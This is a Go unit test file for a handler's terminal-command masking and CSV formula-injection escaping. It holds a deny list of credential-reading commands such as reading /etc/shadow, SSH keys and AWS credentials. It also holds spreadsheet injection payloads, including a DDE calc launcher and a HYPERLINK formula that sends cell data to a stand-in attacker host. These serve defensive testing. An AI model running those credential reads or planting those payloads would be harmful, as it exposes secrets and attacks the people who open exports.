package handler

import (
	"strings"
	"testing"
)

// TestMaskTerminalCommandHidesSecrets pins the denylist. The terminal output
// stream is persisted and readable by anyone with terminal:read, so a command
// that reads a credential must not be logged verbatim.
func TestMaskTerminalCommandHidesSecrets(t *testing.T) {
	masked := []string{
		"cat /etc/shadow",
		"cat /etc/sudoers",
		"cat ~/.aws/credentials",
		"cat ~/.ssh/id_rsa",
		"cat ~/.netrc",
		"cat ~/.npmrc",
		"cat ~/.pypirc",
		"cat ~/.kube/config",
		"cat ~/.docker/config.json",
		"cat ~/.git-credentials",
		"printenv",
		"printenv AWS_SECRET_ACCESS_KEY",
		"set | grep KEY",
		"mysql -uroot -phunter2",
		"mysql --password=hunter2 db",
		"curl -H 'authorization: Bearer sk-live-abc'",
		"curl --token sk-live-abc",
		"unzip -P secret archive.zip",
		"git clone --password=x",
	}
	for _, cmd := range masked {
		if got := maskTerminalCommand(cmd); got != "[masked sensitive terminal command]" {
			t.Errorf("maskTerminalCommand(%q) = %q, want masked", cmd, got)
		}
	}

	visible := []string{
		"ls -la",
		"id",
		"whoami",
		"ps aux",
		"cat /etc/hosts",
		"cat /etc/passwd",
		"grep -r TODO .",
		"docker ps -a",
		"kubectl get pods",
		"git status",
	}
	for _, cmd := range visible {
		if got := maskTerminalCommand(cmd); got != cmd {
			t.Errorf("maskTerminalCommand(%q) = %q, want unchanged", cmd, got)
		}
	}
}

func TestMaskTerminalCommandTruncatesLongCommands(t *testing.T) {
	long := strings.Repeat("a", 300)
	got := maskTerminalCommand(long)
	if len(got) != 259 {
		t.Errorf("length = %d, want 259 (256 + ellipsis)", len(got))
	}
	if !strings.HasSuffix(got, "...") {
		t.Errorf("truncated command should end with an ellipsis, got %q", got[len(got)-10:])
	}
	// Truncation must not strip a secret that appears past the cut.
	secret := "cat /etc/shadow"
	got = maskTerminalCommand(strings.Repeat("echo hi ", 60) + secret)
	if strings.Contains(got, "/etc/shadow") {
		t.Errorf("secret past the truncation point survived: %q", got)
	}
}

// TestEscapeCSVCellNeutralisesFormulaInjection guards the audit export. Several
// columns are attacker-influenced (chat_uploads records the request body path
// as ResourceID), so a low-privileged user can plant a formula that a
// higher-privileged auditor executes by opening the export in Excel.
func TestEscapeCSVCellNeutralisesFormulaInjection(t *testing.T) {
	dangerous := []string{
		"=1+1",
		"=cmd|'/c calc'!A1",
		"+1+1",
		"-1+1",
		"@SUM(1+9)*cmd|'/c calc'!A0",
		"\t=1+1",
		"\r=1+1",
		"  =1+1",
		" \t\r\n=1+1",
		`=HYPERLINK("http://evil.example.com?d="&A1,"click")`,
	}
	for _, in := range dangerous {
		got := escapeCSVCell(in)
		if !strings.HasPrefix(got, "'") {
			t.Errorf("escapeCSVCell(%q) = %q, want a leading quote", in, got)
		}
		// The original value must be preserved after the quote.
		if !strings.HasSuffix(got, strings.TrimLeft(in, " \t\r\n")) &&
			!strings.HasSuffix(got, in) {
			t.Errorf("escapeCSVCell(%q) = %q, lost the original value", in, got)
		}
	}

	// Values that merely contain an equals sign mid-string are not formulas.
	benign := []string{
		"",
		"   ",
		"ls -la /tmp",
		"a=b",
		"GET /api/v1/asset?id=1",
		"user@example.com",
		"1+1=2",
		"nmap -sV 10.0.0.1",
	}
	for _, in := range benign {
		if got := escapeCSVCell(in); got != in {
			t.Errorf("escapeCSVCell(%q) = %q, want unchanged", in, got)
		}
	}
}

// TestEscapeCSVCellPreservesLeadingQuoteForBenignText guards against a mask
// that prefixes every value, which would corrupt normal audit data.
func TestEscapeCSVCellDoesNotMaskOrdinaryText(t *testing.T) {
	for _, in := range []string{"GET /api/projects/42", "user.login", "2026-01-02T03:04:05Z"} {
		if got := escapeCSVCell(in); got != in {
			t.Errorf("escapeCSVCell(%q) = %q, want unchanged", in, got)
		}
	}
}
